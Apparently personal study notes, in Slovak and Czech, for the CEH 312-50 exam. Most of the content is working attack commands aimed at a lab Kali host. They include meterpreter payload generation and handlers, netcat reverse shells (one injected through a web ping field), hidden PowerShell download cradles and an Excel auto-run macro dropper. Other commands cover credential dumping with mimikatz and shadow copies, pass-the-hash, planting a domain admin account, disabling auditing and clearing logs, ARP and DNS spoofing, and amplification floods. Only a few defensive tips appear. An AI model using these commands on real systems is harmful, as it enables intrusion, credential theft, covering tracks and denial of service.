# skuska 312-50

examcollection.com

- 80 usd/y + 120 ECE/3y

# basics

<https://moxie.org/software/sslstrip/>

siet prihlasovanie: 802.1x

nmap, hpin63, wireshark - capture filtre + disp filters, IDS -> Firewall rules (ip tables), NTHASH, CACHEDCRED, NTLM, KERBEROS, ssl + cert, csrx, xss, sqli, command...  
GHDB - google hacking database

application, proxy whitelisting whitelisting, operatory < >

gpedit.msc - software restriction policies - whitelist na konkretne aplikace

excell -> options -> trust center -> zakazat makra iba na podpisane

použité IP adresy v dokumente:
10.0.0.170 - kali
10.0.0.40 - win7

# kali

kopirovanie cez putty: pscp e:\Info.txt root@10.0.0.170:/root/Desktop/info_copy.txt

--------------------------------------

vypisat listener: netstat -nltp  
zapnut listener netcat: nc -lvvp 99  
pripojit sa na netcat: nc 10.0.0.170 99 -e cmd.exe  

# zip/rar baliky ako exe

- poznamka: syswow64 obsahuje 32 bitove programy

balickovac: c:\windows\SysWOW64\iexpress.exe  
zmena ikonky, atd: reshacker (Resource Hacker)

# meterpreter, metasploit

msfconsole

/Mat/lab/LAB-MoD7-MSFConsoleHowTo.txt
```bash
: USE 		= jdeme vytvorit
: SET 		= nastavit parametry spojeni
: exploit -j 	= spustit handler v multilistener stavu
: LHOST		= IP naslouchajiciho C&C
: LPORT		= PORT naslouchajiciho C&C


: payload (RAT)
use  payload/windows/meterpreter/reverse_tcp

set  lhost  10.0.0.170

set  lport  4444

generate  -t  exe  -f /var/www/html/msfx2.exe

generate  -t  psh  -f /var/www/html/msfx2.ps1


: handler (ovladac C&C)
use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set lhost 10.0.0.170

set lport 4444

set ExitOnSession false

exploit  -j


: Kontrola session
sessions  -l          (Ve sloupecku connection vidite 10.0.0.160:4444)

sessions  -i ID Vasi session  (vsimnete si, ze se zmenil prompt na meterpreter - nyni jiz nejsou dostupne puvodni prikazy platne globalne v msf)

: Co delat v session
pwd         	(kde jsem na napadenem pocitaci)
cd		(zmena adresare)
lpwd, lcd	(to stejne, ale u me na C&C)
upload		(nahrat libovolny soubor z meho lpwd do vzdeleneho pwd)
download 	(stahnout libovolny soubor ze vzdaleneho pwd do meho lpwd)
execute -f soubor.bat	(spustit vybrany soubor - nezapomente na escape backslashe - c:\\windows\\...)
keyscan_start	(spusti keylogger)
keyscan_dump	(vypise keylogger)
```

# powershell

## základy

foreach alias %  
where alias ?  
stringy v uvodzovkach ""  
{} je scriptblok  
$_ je pristup k objektu  

napr:  
ps | where { $_.processname -eq "calc" -and $_.id -gt 5000 } | % { $_.Kill() }  
vypisat metody atd cez Get-Member: "teststring" | Get-Member  
() zatvorky aby to bralo ako objekt napr: ("aa").length  

## príklad schovania malwaru

stiahnut favicon.ico a napr v 50-100 byte zober string  
$a1=( new-object system.net.webclient ).downloadstring('<https://kali/favicon.ico').substring(49,50)>  
schovane cez -bxor, viac casti, ....  
dá sa použiť aj invoke-webrequest -> ale ten je dostupný len na novších powershelloch  

## obchádzanie spúštania powershell scriptov

powershell invoke-expression(type scipt.ps1)  
invoke-expression alias IEX  

napr.:  
viditelny:  
powershell -noexit iex(new-object system.net.webclient).downloadstring('http://10.0.0.170/msfx2.ps1')  
neviditelny:  
powershell -win hidden -noexit iex (new-object net.webclient).downloadstring('http://10.0.0.170/msfx2.ps1')  

↑ napr. zabalit cez iexpress.exe

### 32 bit na 64 bit win

64 bitove programy su v windows\system32  
32 bitove su v windows\syswow64\  
ak pustime z 32 bitove programu cmd v windows\system32. potom vidi windows\system32 s 32 bit programami, ak chceme pristupit k 64 bit treba ist cez: c:\windows\sysnative\cmd.exe  

wmic /node:"Student06-03" path win32_process call create commandline="c:\windows\syswow64\cmd.exe /c powershell -win hidden -noexit iex (new-object net.webclient).downloadstring('http://kali/msfx2.ps1')"

### meterpreter migrácia threadu na iný process

z meterpreter sessionu: migrate -N explorer.exe

### excell makrá

poznamka: excell spusta 32 bit cmd/powershell tj. windows\system32 je nalinkovana zlozka syswow64  
editor makier: alt+F11  
vlavo dvojklik na ThisWorkbook  

```
Private Sub Workbook_Open()
    Call Shell("powershell -win hidden -noexit iex (new-object net.webclient).downloadstring('http://10.0.0.170/msfx2.ps1')", vbHide)
End Sub
```

### powershell inšpirácia scriptov

<https://github.com/PowerShellMafia/PowerSploit>

keylogger: <https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1>

# NTHASH

databaza active directory v: c:/windows/ntdsPntds.dit

NTLM=antireplay mechanizmus:  
server generuje random salt ako challange ktory sa miesa z nthashom hesla, z toho sa spravi md5 a to sa posiela ako response na challange

LSASS.exe -> overovaci proces

riešenie:

- PAM - priviledged access management
- prihlasovanie smart kartami
- kerberos enforced (ak nie je enforced da sa obyst pristupom cez ip adresy namiesto domenovych nazvov, zlý čas, chýba SPN, SVCXnetwork system, external ad trust), ale musi byt aj smart card is required for interactive logon (navyse digitalne podpíše hash pri kerberos preauthentification) inak sa da pouzit pass the hash

## Spadla z oblakov

ak by sa prihlasil administrator na workstation pocitaci/akomkolvek -> moze byt v msconfig nastaveny program po spusteni

potom napr.: `sc %logonserver% query spooler` -> ak funguje uzivatel je domain admin  
tj: `sc %logonserver% query spooler >NUL && net user majka SpadlaZ0blakov /add /domain && net localgroup administrators /add majka /domain`

# REGISTRE

C:/windows/system32/config == regedit->hkey_local_machine  
SAM - lokalni ucty(nthash)  
SECURITY - domenove ucty CachedCredentials (PBKDF2) (format: domena;login;PBKDF2-MD5(login+nthash))  
SOFTWARE  
SYSTEM - boot key (sifruje pbkdf aj nthashe) (nastavenie v syskey.exe)  

## rozparsovanie - lokalne ucty

### "zaloha" na pc

reg save hklm\system c:\system  
reg save hklm\sam c:\sam

### parsovanie mimo
locate secretdump.py  
```
root@kali20182:/usr/share/doc/python-impacket/examples# ./secretsdump.py -sam /tmp/sam -system /tmp/system local
```

# vzdialene spúštanie, zálohy AD

vypis writorov: vssadmin list writers

list metod cez wmiexplorer.exe  
wmic path win32_process call create commandline=calc.exe  
wmic path win32_process where processid="5412" get caption,processid,sessionid  

vzdialene:  
wmic /node:"STUDENT06-05" path win32_process call create commandline=calc.exe

## shadow copy

copy c:\windows\system32\config\SAM e:\  
nefunguje lebo subor je otvoreny

wmic path win32_shadowcopy call create volume=c:\  

```
Executing (win32_shadowcopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{A52DDA89-7C38-4984-9157-E9AE43F055E5}";
};
```

wmic path win32_shadowcopy where id="{A52DDA89-7C38-4984-9157-E9AE43F055E5}" get deviceobject
```
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM e:\

wmic /node:%logonserver:vlnovka2% path win32_process call create "cmd /c copy \\?\GLOBALROOT\DeviceHarddiskVolumeShadowcopy2\windows\ntds\ntds.dit c:\"

### použitie hashu

Linux verzia:  
winexe -U domena/uzivatel%Heslo //10.0.0.40 cmd

crack hashu netreba - staci pouzit hash  
LM hash je zbytocny - moze sa pouzit lubovolny string v spravnom formate  
pth-winexe -U domena/uzivatel%LMHash:NTHash //10.0.0.40 cmd  

na windowse:  
mimikatz
```
privilege:debug
sekurlsa::pth /user:pthdemo /domain:ceh /ntlm:nthashblablabla /run:cmd
```

### domenove heslá z ramky

ak je prihlaseny iny uzivatel na worstationne  
spravime dump z lsass.exe  
cez mimikatz  
sekurlsa::minidump e:\lsass.dmp  
sekurlsa::logonpasswords  

vzdialene:  
copy c:\Users\Public\Desktop\pth\procdump.exe \\10.0.0.10\admin$  
wmnic /node:"10.0.0.10" path win32_process call create "procdump -accepteula -ma lsass.exe c:\8.dmp"  
copy \\10.0.0.10\c$\8.dmp \\10.0.0.2\ceh-tools

# Domenove účty

PAM alebo vzdy loaklny admin pre kazdy pocitac s inym heslom  
laps - stiahnut z microsoftu

# SCHOVAVANIE DAT

## NTFS streamy

alternativne streamy, nezobrazuju sa jednoducho vo velkosti suboru, dir, ...  
streamy vypise rekurzivny dir: dir /r  
standartne napriklad subory stiahnute z internetu prehliadac vlozi do suboru :Zone.Identifier

```
notepad maly.txt
notepad maly.txt:tajne.txt
type g:\nc.exe > c:\maly.txt:Zone.Identifier
wmic process call create c:\maly.txt:Zone.Identifier
```

powershell verzia
```
Get-Content G:\nc.exe -raw | Set-Content E:\nieco.txt -Stream Zone.Identifier
```

## STEGANOGRAPHY

schovavanie zaencryptovanych dat napr. do least significant bitov do obrazkov

## Mazanie logov

logy posebe nemazať - mazanie je podozrivé, ak si to doteraz nikto nevšimol nie je to treba logy sa časom premazu samé

- secpol.msc

keď už:  
vypnutie audiovania pred mazanim: `auditpol /set /category:* /success:disable /failure:disable`  
mazanie: `sc.exe create ViktorCistic binpath= "wevtutil cl security && sc.exe start ViktorCistic"` - mazanie prebehne pod systemom nie uživatelom  
pripadne zakazat odosielanie logov vo firewalle (allow+authenc je nenapadnejsie nez zakazat):  
`netsh adv fir add rule name=nocom program=calc.exe dir=out action=allow security=authenc`  
`netsh adv fir add rule name=compull protocol=tcp port=5985 dir=in action=allow security=authenc`  

varianta 2:  
`auditpol /set /category:* /sucess:enable /failure:enable` a zahltiť logy napr. streamovanim filmu multicastom

- všetko púštať cez službu aby v logoch nebol uživatel ale system

# Scanovanie

`wmic nicconfig where ipenabled="true" get ipaddress,ipsubnet`

naviazane zive spojenia su v arp cache, pripadne netstat:  
`arp -a`

## alivescan

- rovnaka vlan(subnet) -> arp scan
- ina -> ICMP, TCP: 80,443,23,22,135,3389,5900

arp neblokuju bežné firewally (iptables, windows firewall funguje len na ip vrstve a viac)

poznamka: wireshark filter pre mac adresu: ether host 00:00:00:00:00:00

nmap -sn

nmap ping scan (ale ping sa nepouziva - posiela to len arp dotazy)  
`snamp -sn -n 10.0.0.0/24`

## 2. PORT SCAN

```
syn ->
<- sync,ack
ack ->
psh,ack ->
<- ack
<- pshack
ack ->
<- fin,ack
ack ->
fin, ack ->
<- ack
```

initial sequence number(random)  
tcp.syn = synchronizace ISN  
TCP.ACK=ANSET  
TCP.PCH=DATA  
TCP.FIN=hotovo(obojsmerne)  
TCP.RST=Jednostranne prerusenie  
TCP.URS=critical data ptreset

### HALF OPEN SPOJENIE

```
syn ->
  <- sync,ack
RST -> 
```

v tomto okamžiku je naviazané spojenie, ale ešte by nebolo zalogované na firewalle  
nazýva sa to: synscan, halfopen, stealth

namp 10.0.0.40 -p 80 -Pn -n # Pn (no alive scan) /n (keep number)  
namp 10.0.0.40 -p 80 -Pn -n -sS # sS (Syn scan - hladam odpoved SYN)

hping3 10.0.0.40 -c 1 -p 80 -S # vrati ip hlavicku odpovede

da sa rozpoznat win/linux podla TTL, window size, pripadne chovanie ak sa poslu nestandartne flagy.

windows:  
`len=46 ip=10.0.0.40 ttl=128 DF id=31670 sport=80 flags=SA seq=0 win=8192 rtt=7.8 ms`  
linux:  
`len=44 ip=10.0.0.168 ttl=64 DF id=0 sport=80 flags=SA seq=0 win=29200 rtt=7.8 ms`

### da sa detekovat aj verzia kernelu/service packu podla chovania

- RFC793

pošleme niečo mimo sekvenciu

#### windows

pošle reset ked je niečo zle

```
1 PA ->
<- A
2 PA ->
<- A
.
.
.
99 UF ->
<-R
```

#### linux

by neposlal reset a počkal než data prijdu znova

priklad:

- linux:

```
hping3 10.0.0.168 -p 80 -FUP -c 1  
HPING 10.0.0.168 (eth1 10.0.0.168): FPU set, 40 headers + 0 data bytes
```

- windows:

```
hping3 10.0.0.40 -p 80 -FUP -c 1 
HPING 10.0.0.40 (eth1 10.0.0.40): FPU set, 40 headers + 0 data bytes
len=46 ip=10.0.0.40 ttl=128 DF id=32294 sport=80 flags=RA seq=0 win=0 rtt=7.9 ms
```

### nmap

`nmap 10.0.0.0/24`

fair user policy FUP XMASS (-sX)  
"" NULL (-sN)  
A ACK (-sA)  
F FIN (-sF)  

`nmap -sX 10.0.0.40 -p 80 -Pn -n --reason`

```bash
root@kali20182:# nmap -sX 10.0.0.168 -p 80 -Pn -n --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-13 13:34 CET
Nmap scan report for 10.0.0.168
Host is up, received arp-response (0.00013s latency).

PORT   STATE         SERVICE REASON
80/tcp open|filtered http    no-response
MAC Address: 00:15:5D:1C:22:0B (Microsoft)

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
root@kali20182:# nmap -sA 10.0.0.168 -p 80 -Pn -n --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-13 13:35 CET
Nmap scan report for 10.0.0.168
Host is up, received arp-response (0.00017s latency).

PORT   STATE      SERVICE REASON
80/tcp unfiltered http    reset ttl 64
MAC Address: 00:15:5D:1C:22:0B (Microsoft)

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```

- najprv zistime ze nechodi odpoved - bud je to otvorene alebo odfiltrovane firewallom
- potom pošleme ack, vráti sa nám reset takže tam nie je firewall. Takže je tam linux a port je otvoreny

## 3. OS SCAN

`nmap -O`

## 4. UDP SCAN

### nezmysel -> OPEN

no response / <- error

### nezmysel -> CLOSED

<- ICMP PORT UNREACHABLE

### príklad

pošleme nezmysel na port

- ak nepride odpoved je bude otvoreny alebo odfiltrovany firewallom
- skusime iny port a vrati sa nam ICMP port unreachable -> nie je tam firewall

### príkaz pre nmap

nmap -sU -Pn -n 10.0.0.40 -p 138 --reason

### firewall filter pre ip adresy

```
win7                               w2012
10.0.0.20:135                      10.0.0.40:3389
```

- na w2012 port 3389 je firewall pravidlo ze tam môže pristupovať len ip adresa 10.0.0.20
- z tretieho pc nmap 10.0.0.40 -p 3389 nefunguje
- nmap 10.0.0.40 -p 3389 -sI 10.0.0.20:135 #ked tam nemozem ja, otazka: moze na 10.0.0.40 pocitac 10.0.0.20?

#### ako funguje -sI:

```bash
# pošleme syn

root@kali20182:~# hping3 10.0.0.40 -p 3389 -c 1 -S
HPING 10.0.0.40 (eth1 10.0.0.40): S set, 40 headers + 0 data bytes

--- 10.0.0.40 hping statistic ---
1 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

# ziadna odpoved, skusime druhe pc o ktorom vieme ze ma otvoreny port 135

root@kali20182:~# hping3 10.0.0.20 -p 135 -c 1 -S
HPING 10.0.0.20 (eth1 10.0.0.20): S set, 40 headers + 0 data bytes
len=44 ip=10.0.0.20 ttl=128 DF id=28480 sport=135 flags=SA seq=0 win=8192 rtt=7.8 ms

--- 10.0.0.20 hping statistic ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 7.8/7.8/7.8 ms

# skusime poslat syn,ack

root@kali20182:~# hping3 10.0.0.20 -p 135 -c 1 -SA
HPING 10.0.0.20 (eth1 10.0.0.20): SA set, 40 headers + 0 data bytes
len=40 ip=10.0.0.20 ttl=128 DF id=28481 sport=135 flags=R seq=0 win=0 rtt=7.8 ms

--- 10.0.0.20 hping statistic ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 7.8/7.8/7.8 ms

# prisiel reset, tj. zacneme ho bombardovat SA

root@kali20182:~# hping3 10.0.0.20 -p 135 -SA
HPING 10.0.0.20 (eth1 10.0.0.20): SA set, 40 headers + 0 data bytes
len=40 ip=10.0.0.20 ttl=128 DF id=28502 sport=135 flags=R seq=0 win=0 rtt=7.9 ms
len=40 ip=10.0.0.20 ttl=128 DF id=28503 sport=135 flags=R seq=1 win=0 rtt=7.8 ms
len=40 ip=10.0.0.20 ttl=128 DF id=28504 sport=135 flags=R seq=2 win=0 rtt=7.8 ms

# id idu posebe, takze na tom porte prebieha iba tato komunikacia
# ak by id nešli posebe, pocitac sa bavil s niekým iným

root@kali20182:~# hping3 10.0.0.40 -p 3389 -S -c 1 --spoof 10.0.0.20 --baseport 135
HPING 10.0.0.40 (eth1 10.0.0.40): S set, 40 headers + 0 data bytes

--- 10.0.0.40 hping statistic ---
1 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

# vidime medzeru pretoze .40 posle reset na .20 
#len=40 ip=10.0.0.20 ttl=128 DF id=28656 sport=135 flags=R seq=19 win=0 rtt=5.8 ms
#len=40 ip=10.0.0.20 ttl=128 DF id=28658 sport=135 flags=R seq=20 win=0 rtt=5.7 ms

```

- obrana: dhcp spoofing, ip source guard, ingres filter na routru (aby sa nedal oscanovat medzi subnetami)


## NETBIOS, CIFS

port: netbios: 139, cifs: 445  
HOSTNAME  
DOMAIN  

win: `nbtstat -A 10.0.0.40 | findstr /i regist`  
linux: (NetBios over TCP) `nbtscan -v 10.0.0.0/24`  
detaily (defaultne nastavenia windows vratia access_denied): `nmap 10.0.0.40 -p 139,445 --script=smb-enum*`  

## LDAP

port: 389

HOST  
DNSDOMAIN  
ADSITE  
OS  

```
nmap 10.0.0.0/24 -p 389 --open -n
Nmap scan report for 10.0.0.30
Host is up (0.00041s latency).

PORT    STATE SERVICE
389/tcp open  ldap
MAC Address: 00:15:5D:1C:22:08 (Microsoft)

Nmap scan report for 10.0.0.40
Host is up (0.00085s latency).

PORT    STATE SERVICE
389/tcp open  ldap
MAC Address: 00:15:5D:1C:22:00 (Microsoft)

Nmap done: 256 IP addresses (8 hosts up) scanned in 1.64 seconds
```

`nmap 10.0.0.0/24 -p 389 --open -n --script=ldap-rootdse`  
vypise aj nazov site, verziu OS

## DNS

port: 53 UDP aj TCP

forward lookup zones  
reverse lookup zones -> z ip na meno  

poznamka: treba vediet syntaxe nastrojov - nslookup / dig /host  
`nslookup -q=A www.seznam.cz. 8.8.8.8`

Name Server(NS)=ktory dns server preklada tuto zonu  
SOA=primarny(rw) server z ktoreho sa replikuju na sekundarne servery podla intervalu nastaveneho v SOA zaznamu  
Pointer zaznamy(PTR)=IP -> UM  
A=UM -> IPv4  
MX=kdo je SMTP server pre tuto domenu  
CNAME=alias->UM->cez A zaznam na IP adresu  
AXFR=Complete zone transfer  
SRV=Služba->UM

ak je niekde povoleny AXFR pre vsetkych dokazeme vytiahnut vsetky nazvy aj bez hadania:  
`nslookup -vc -q=AXFR dalibor.xy. 10.0.0.40`

napr. 
najprv si lookupneme NS servery, potom vyskusame:  
`nslookup -vc -q=AXFR ticketportal.cz. ns1.denax.sk`

cez PTR vycitame domeny z IP adries...  
`nmap -sL 192.168.6.0/24 --dns-server=10.0.0.2 | grep "("`

napr z guest siete vytiahnut servisny zaznam:  
`nslookup -q=srv _LDAP._TCP.gopas.cz`  
potom nmap -sL subnetu pre nazvy pre ip adresy

### dir syntax

`dig NS ticketportal.cz. @8.8.8.8`  
`dig +tcp AXFR tickerportal.cz. @ns.denax.sk`  
`dig SRV _ldap._tcp.gopas.cz`  

## SNMP

port: 161

COMMUNITY STRING=heslo  
PUBLIC=readonly  
PRIVATE=readwrite  

bruteforce hesiel:  
`onesixtyone  -c /usr/share/doc/onesixtyone/dict.txt 10.0.0.50`

### vyhladavanie zariadeni

```bash
nmap -sU -p 2,161 --reason 10.0.0.0/24
locate .nse | grep snmp
nmap -sU -p 2,161 --reason 10.0.0.160 --script /usr/share/nmap/scripts/snmp-brute.nse
```

### "zaloha" cisco konfiguracie

```bash
msfconsole
use auxiliary/scanner/snmp/cisco_config_tftp
options
set rhosts 10.0.0.160 # adresa routru
set lhost 10.0.0.170 # moja adresa
set community secret
set outputdir /tmp
run

use auxiliary/scanner/snmp/cisco_upload_file
set source startup
# ...
# snmp set na reboot aby sa aplikoval startup script
```

# SPAN

SPAN (Switch Port Analyze Network)=Mirror

cisco config:

```
monitor session 1 source vlan 10
monitor session 1 destination g0/0/3
```
source=koho sledujeme
destination=IDS

## zachytavanie trafficu

```
tcpdump -i eth1 -v -e -n ip host 10.0.0.20 and ip host 10.0.0.40 and icmp
```

-v = verbose  
-e = zobrazit ethernet hlavicky (SMAC,DMAC)  
-n = nechat ip adresy a porty v ciselnom formate

# MAC flooding

zahltenie tabulky mac zaznamov na switchi, aby zahodil zaznamy realnych pocitacov a spraval sa ako hub
`macof -i eth1`

ochrana:
`switch port-sec maximum 10` - na jednom porte maximalne 10 mac adries - port sa potom zaloguje/vypne

# APR Poisoning

posledná (aj falošná) ARP odpoveď vyhráva.

## windows routing, arp cache vypis

```
route print -4
arp -a 10.0.0.199
```

## MITM - Ettercap

### syntax

/mac/ipadresa/port/ -> /*/ipadresa/*/ -> //ipadresa//  
cielova skupina 1 ()  
cielova skupina 2 (moja adresa)  

1cil: /mac/ip/port/ //ip//  
viac cielov: /ip1-x/port /ip1-x//  

### dns spoofing

```bash
ettercap -TqM arp:remote //10.102.0.1// //10.102.20.131// -i eth0
# zmacknut p ako plugins
dns_spoof
```

uprava dns zaznamov:

```
vim /etc/ettercap/etter.dns
ettercap -TqM arp:remote /10.102.0.1-5// //10.102.20.131// -i eth0 -P dns_spoof
```

### pre spoof s certifikatmi

/etc/ettercap/etter.config
```
[privs]
ec_uid = 0
ec_guid = 0

# odkomentovat [linux] -> iptables riadky pre prerouting
```

- sslstrip (<https://moxie.org/software/sslstrip/)>


### ochrana proti traveniu arp

dhcp snooping
`ip arp inspection vlan 1` == skumaj pravdivost arp (eth protocol 0806)

## staticke travenie arp tabulky

na win pridame staticky zaznam s mac adresou kaliho
```
### hladanie sietovky wmic nicconfig where ipenabled="true" ipaddress, interfaceindex
### 20 je interfaceindex
### 10.102.0.1 - gateway
netsh int ip set nei 20 10.102.0.1 00-15-5d-1c-22-02
### do povodneho stavu cez netsh int ip delete
```

na kali je zapnuty forwarding a natovanie
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

###
tcpdump -i eth0 ip host 8.8.8.8 -n -e
```

## routing

nechat default gateway a pridat pravidla pre  
0/1  
128/2  
192/3  

```
route add 0.0.0.0 mask 128.0.0.0 [kali-ip]
route add 128.0.0.0 mask 192.0.0.0 [kali-ip]
route add 192.0.0.0 mask 224.0.0.0 [kali-ip]
```

### rogue dhcp server, dhcp starvation, dhcp snooping

DISCOVER -> hladam DHCP servery  
<- OFFER=ponuka ip+3,6  
-> request = vybrane  
<- ack  

dhcpstarv:
```
dhcpstarv -i eth1
```

dhcp server:  

- dnsmasq - jedoduchy  
- isc-dhcp-server - robustnejsi  

```

dnsmasq --dhcp-range=eth1,10.0.0.100,10.0.0.120,2h --dhcp-option=3,10.0.0.170 --dhcp-option=6,10.0.0.40 --dhcp-option=15,'hack.ed'

#vypnutie
killall dnsmasq
netstat -naup
```

# WEB

## CROSS SITE REQUEST FORGERY

get/post medzi strankou ak nema csrf token

## CROSS SITE SCRIPTING

## SQL INJECTION

```
sqlmap --cookie="security=low; PHPSESSID=rjfi94e9jfgdhd31o9tpa1k9p5" -u "http://gameover/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#"
```

### command execution

kali:
```
nc -lvvp 99
```

stranka:
```
ping -c 8.8.8.8 | ncat ...
ping -c `ncat -e /bin/sh 10.0.0.170 99`
```

## otvorit stranku v IE

```
hh http://kali.cz
```

adresa v 10 sustave:
```
hh http://167772330
```

# Android

```
: payload (RAT)
use  payload/android/meterpreter/reverse_tcp

set  lhost  10.0.0.170

set  lport  3333

generate  -t  raw  -f /var/www/html/x.apk
```

```
use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set lhost 10.0.0.170

set lport 3333

set ExitOnSession false

exploit  -j
```

# DOS

iis vytazeniu driveru tcp, system proces 4:
hping3 10.0.0.40 -p 80 -S --flood


## spoof adresy
posleme napr. 50B dotaz na DNS server, odpoveď je 80x väčšia, môžeme spoofnuť niekoho ip adresu aby odpoveď posielali tam

```
ifconfig lo:1 5.6.7.8
dig -b 5.6.7.8 +bufsize=8192 +notcp +dnssec ANY cz.
```


# Google hacking

exploit-db.com:
GHDB

príklad parametrov
```
site:
inurl:archive
filetype:sql;rdp;docx
intitle:nadpis
intext:login
```

inurl:/iisstart.htm intitle:"IIS7"